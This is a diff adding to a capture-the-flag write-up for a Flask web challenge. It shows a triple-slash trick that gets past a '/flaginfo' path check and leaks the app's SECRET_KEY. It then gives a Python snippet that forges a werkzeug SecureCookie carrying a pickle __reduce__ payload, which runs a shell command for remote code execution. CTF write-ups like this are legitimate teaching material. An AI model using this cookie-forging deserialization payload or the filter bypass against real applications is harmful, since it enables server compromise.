@@ -192,9 +192,29 @@ We can replace the current value of our `session_data` cookie with this value, a
 
 ![Imgur](https://i.imgur.com/CFpWEz8.png)
 
-Now we create a post with `http://127.0.0.1:5000///flaginfo` and obtain the value of `SECRET_KEY`. Why are there 3 slashes instead of one? Because of this check:
+Now we create a post with `http://127.0.0.1:5000///flaginfo` and obtain the value of `SECRET_KEY`. Why are there 3 slashes instead of one in our URL? Because of this check:
 
 ```python
-    if path.startswith('/flaginfo'):
-        return None
+if path.startswith('/flaginfo'):
+    return None
+```
+
+The `path` variable will contain the part of our URL after `http://127.0.0.1:5000`, therefore by injecting more slashes than one, we don't change the actual URL when it's resolved, but it will change the value of `path` when parsing our URL so we can bypass the check. (Theoretically 2 slashes should work, but for some reason I had success with 3 and not 2).
+
+![Imgur](https://i.imgur.com/gOfFJsJ.png)
+
+With our newly created post, we have obtained the value of `SECRET_KEY` as `superdupersecretflagonkey`. We can now sign our own cookies and do on RCE to get our flag. To generate the cookie, we will use this code (note the `username` is the username of the admin that we are logged in as):
+
+```python
+import subprocess
+from werkzeug.contrib.securecookie import SecureCookie
+
+class a(object):
+    def __reduce__(self):
+        return (subprocess.check_output, (['cat', 'flag.txt']))
+
+SECRET_KEY = 'superdupersecretflagonkey'
+
+print(SecureCookie({'name':a(), 'username':'meow_cf665777'}, SECRET_KEY).serialize())
+```
 ```
